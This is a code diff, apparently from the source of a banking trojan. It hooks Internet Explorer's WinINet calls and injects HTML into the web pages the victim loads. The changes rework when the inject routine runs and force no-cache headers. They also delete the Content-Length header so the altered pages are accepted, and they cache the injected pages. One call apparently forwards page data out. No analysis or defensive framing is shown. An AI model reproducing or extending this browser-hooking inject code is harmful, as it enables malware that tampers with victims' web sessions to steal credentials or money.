@@ -89,6 +89,9 @@ typedef HINTERNET (WINAPI *FUNC_InternetConnect)
 	);
 
 
+void AddPageToCashe(PRequest Request);
+
+
 typedef BOOL (WINAPI *FUNC_InternetWriteFile) (HINTERNET hFile, LPCVOID lpBuffer, DWORD dwNumberOfBytesToWrite, LPDWORD lpdwNumberOfBytesWritten );
 
 
@@ -189,9 +192,14 @@ void FreeIRRequestData(LPVOID Request) {
 bool DoInjectIE(PRequest Request)
 {
 
+	if (!Request->IsInject || Request->Injected)
+		return Request->IsInject && Request->Injected;
+
 	#ifdef BssSendFileH
 		AddBSSFile(Request->URL, Request->Buffer, Request->BufferSize);
 	#endif
+
+	Request::CloseReceiveData(Request);
 
 	// Инициализируем информацию о сессии
 	Request->Injected = true;
@@ -211,7 +219,11 @@ bool DoInjectIE(PRequest Request)
 
 	bool Res = HTMLInjects::Execute(Request, &Session);
 
-
+	if (Res)
+	{
+		Request->DocumentNeedCached = true;
+		AddPageToCashe(Request);
+	}
 	return Res;
 }
 #endif
@@ -809,7 +821,16 @@ DWORD WINAPI ReadDataProc(PRequest Request)
 		MEMBLOCK::AddBlock(List, IB.lpvBuffer, IB.dwBufferLength);
 	}
 
-	Request::CloseReceiveData(Request);
+
+    Request::CloseReceiveData(Request);
+
+#ifdef HTMLInjectsH
+	// Обрабатываем загруженные данные
+	if (r )
+	{
+		DoInjectIE(Request);
+	}
+#endif
 
 	// освобождаем использованные ресурсы
 	pCloseHandle(Request->Event);
@@ -818,18 +839,6 @@ DWORD WINAPI ReadDataProc(PRequest Request)
 	RestoreCallbackMethod(Request);
 
 	IEDBG(Request, Request->Buffer, "Документ загружен");
-
-#ifdef HTMLInjectsH
-	// Обрабатываем загруженные данные
-	if (r && !Request->Injected)
-	{
-		if (DoInjectIE(Request))
-		{
-			Request->DocumentNeedCached = true;
-			AddPageToCashe(Request);
-		}
-	}
-#endif
 
 	// Устанавливаем признак загруженной страницы
 	Request->FileReaded = true;
@@ -1238,6 +1247,8 @@ BOOL WINAPI HOOK_HttpQueryInfoA(HINTERNET hRequest, DWORD dwInfoLevel,
 
 	PRequest R = Request::Find(Requests, hRequest);
 
+	PCHAR Buf = (PCHAR)lpBuffer;
+
 	if (R != NULL && R->IsInject)
 	if (dwInfoLevel == HTTP_QUERY_RAW_HEADERS_CRLF)
 	{
@@ -1245,10 +1256,12 @@ BOOL WINAPI HOOK_HttpQueryInfoA(HINTERNET hRequest, DWORD dwInfoLevel,
 		PCHAR Buf = (PCHAR)lpBuffer;
 		DWORD Cur = *lpdwBufferLength;
 		if (Cur < Max)
-        	*(Buf + Cur) = 0;
+			*(Buf + Cur) = 0;
 
 		HTTPParser::SetHeaderValue(Buf, Cur, Max, ParamCacheControl, ValueNoCacheDocument, lpdwBufferLength);
 		*lpdwBufferLength = AnsiStr::Length(Buf);
+
+		*lpdwBufferLength = HTTPParser::DeleteHeader(ParamContentLength, Buf, *lpdwBufferLength);
 	}
 
     return Result;
@@ -1259,12 +1272,9 @@ BOOL WINAPI HOOK_HttpQueryInfoW(HINTERNET hRequest, DWORD dwInfoLevel,
 	LPVOID lpBuffer, LPDWORD lpdwBufferLength, LPDWORD lpdwIndex)
 
 {
-
 	BOOL Result =  REAL_HttpQueryInfoW(hRequest, dwInfoLevel,
 		lpBuffer, lpdwBufferLength, lpdwIndex);
-
-
-    return Result;
+	return Result;
 }
 
 // ----------------------------------------------------------------------------
